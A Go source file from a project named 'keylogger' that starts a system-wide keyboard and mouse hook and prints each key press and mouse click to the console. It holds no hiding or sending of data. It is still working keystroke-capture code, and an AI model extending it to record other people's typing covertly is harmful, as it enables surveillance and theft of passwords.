package hook

import (
	"fmt"
	goHook "github.com/robotn/gohook"
	"keylogger/pkg/constants"
)

type KeyEvent struct {
	KeyChar string
	KeyCode uint16
}

func (t *KeyEvent) String() string {
	return fmt.Sprintf("{KeyChar:%s,KeyCode:%d}", t.KeyChar, t.KeyCode)
}

func InitHook() {
	fmt.Println("键盘监听已启动!!")
	hooks := goHook.Start()
	defer goHook.End()
	for ev := range hooks {
		if ev.Kind == goHook.MouseUp || ev.Kind == goHook.KeyUp {
			if ev.Button == goHook.MouseMap["right"] {
				fmt.Printf("mouseRight")
			} else if ev.Button == goHook.MouseMap["left"] {
				fmt.Printf("mouseLeft")
			} else {
				KeyJson := KeyEvent{KeyChar: constants.RawcodeToKeychar(ev.Rawcode), KeyCode: ev.Rawcode}
				fmt.Printf("=>%v<= ", KeyJson.String())
			}
		}
	}
}
